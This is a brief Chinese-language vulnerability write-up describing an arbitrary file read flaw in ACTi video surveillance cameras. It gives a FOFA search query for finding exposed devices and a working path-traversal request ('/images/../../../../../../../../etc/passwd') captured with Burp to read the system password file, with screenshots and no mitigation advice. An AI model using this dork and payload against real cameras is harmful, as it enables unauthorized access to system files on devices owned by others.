# ACTI 视频监控 任意文件读取漏洞

## 漏洞描述

ACTI 视频监控 存在任意文件读取漏洞

## 漏洞影响

> [!NOTE]
>
> ACTI摄像头

## FOFA

> [!NOTE]
>
> app="ACTi-视频监控"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/ac-1.png)

使用Burp抓包

```
/images/../../../../../../../../etc/passwd
```

![](http://wikioss.peiqi.tech/vuln/ac-2.png)

## Goby & POC

![](http://wikioss.peiqi.tech/vuln/ac-3.png)